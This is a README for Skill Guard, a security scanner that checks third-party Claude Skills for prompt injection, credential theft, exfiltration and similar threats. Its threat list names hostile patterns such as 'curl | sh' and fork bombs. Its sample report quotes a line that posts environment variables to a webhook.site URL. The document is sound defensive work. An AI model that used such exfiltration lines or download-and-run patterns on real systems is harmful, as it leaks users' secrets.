# 🔒 Skill Guard

**Security scanner for Claude Skills — Scan before you trust.**

Skill Guard is a security-oriented [Claude Skill](https://docs.anthropic.com/en/docs/agents-and-tools/claude-code/skills) that acts as a gatekeeper: it automatically scans any third-party Skill for malicious behavior **before** it is loaded or executed. Think of it as an antivirus for the Claude Skill ecosystem.

## Why?

Skills downloaded from the internet or third-party sources (e.g., [clawhub.ai](https://clawhub.ai)) can contain:

- **Prompt injection** — hijacking Claude's behavior
- **Data exfiltration** — stealing your code, secrets, or conversation data
- **Credential harvesting** — reading SSH keys, AWS credentials, API tokens
- **Dangerous code execution** — `eval`, `curl | sh`, fork bombs
- **Obfuscated payloads** — base64, hex, zero-width characters, homoglyphs
- **Social engineering** — hiding actions from the user, faking error messages
- **Supply chain attacks** — typosquatted packages, malicious git hooks

Skill Guard detects all of the above and more.

## How It Works

Skill Guard follows a strict **4-phase workflow** for every Skill scan:

| Phase | Description |
|-------|-------------|
| **1. Enumerate** | Recursively lists all files in the target Skill |
| **2. Analyze** | Reads every file and checks against a comprehensive threat checklist |
| **3. Classify** | Rates each finding as CRITICAL, WARNING, or INFO |
| **4. Report** | Presents a bilingual (EN/CN) security report to the user |

### Severity Levels

| Level | Meaning | Action |
|-------|---------|--------|
| 🚫 **CRITICAL** | Prompt injection, credential theft, remote code execution, data exfiltration | **BLOCK** — Skill will not be loaded |
| ⚠️ **WARNING** | Suspicious but potentially legitimate patterns | **WARN** — User decides whether to proceed |
| ℹ️ **INFO** | Unusual but non-malicious patterns | **NOTE** — Inform and proceed |

## Threat Coverage

Skill Guard scans for **8 categories** of threats:

1. **Prompt Injection & Instruction Override** — system prompt hijacking, role-play injection, identity manipulation
2. **Data Exfiltration** — HTTP POST to external URLs, webhook abuse, DNS tunneling
3. **Credential & Secret Harvesting** — SSH keys, AWS creds, env variables, keychain access, cloud metadata
4. **File System Abuse** — reading shell history, writing to startup files, cron persistence, directory traversal
5. **Dangerous Code Execution** — `eval`/`exec`, shell injection, download-and-execute patterns
6. **Social Engineering** — secrecy instructions, fake errors, urgency pressure, impersonation
7. **Obfuscation Techniques** — base64/hex encoding, string concatenation, zero-width chars, homoglyphs
8. **Supply Chain Manipulation** — typosquatted packages, git hooks, malicious postinstall scripts

The full threat taxonomy with detection heuristics and code examples is in [`references/threat-patterns.md`](references/threat-patterns.md).

## Installation

Copy the `skill-guard` folder into your Claude Skills directory:

```bash
cp -r skill-guard ~/.copilot/skills/
```

Once installed, Skill Guard will be triggered automatically whenever Claude is about to load a Skill from an external source.

## Usage

Skill Guard is designed to run **automatically** before any third-party Skill is loaded. You can also invoke it manually:

> "Scan this Skill for security issues"
>
> "Review the safety of the Skill at `~/.copilot/skills/some-skill/`"

### Example Report

```
════════════════════════════════════════════════════
🔒 Skill Security Scan / Skill 安全扫描报告
════════════════════════════════════════════════════
Target / 目标: example-skill
Files Scanned / 扫描文件数: 5
Status / 状态: 🚫 BLOCKED

────────────────────────────────────────────────────
Findings / 发现:
────────────────────────────────────────────────────
[CRITICAL/严重] Data exfiltration via HTTP POST
  File / 文件: scripts/helper.py
  Line / 行号: 42
  Evidence / 证据: requests.post("https://webhook.site/...", data=env_vars)
  Risk / 风险: Sends environment variables to external server

[WARNING/警告] External URL without clear purpose
  File / 文件: SKILL.md
  Line / 行号: 15
  Evidence / 证据: https://example.com/api/track
  Risk / 风险: URL found in Skill that does not require networking

────────────────────────────────────────────────────
Recommendation / 建议:
────────────────────────────────────────────────────
EN: Do NOT load this Skill. Critical data exfiltration detected.
CN: 请勿加载此 Skill。检测到严重数据外泄行为。
════════════════════════════════════════════════════
```

## Project Structure

```
skill-guard/
├── SKILL.md                        # Skill definition & scan workflow
├── references/
│   └── threat-patterns.md          # Full threat taxonomy with examples
├── LICENSE                         # MIT License
└── README.md                       # This file
```

## License

[MIT](LICENSE) © 2026 Ge Jiajia
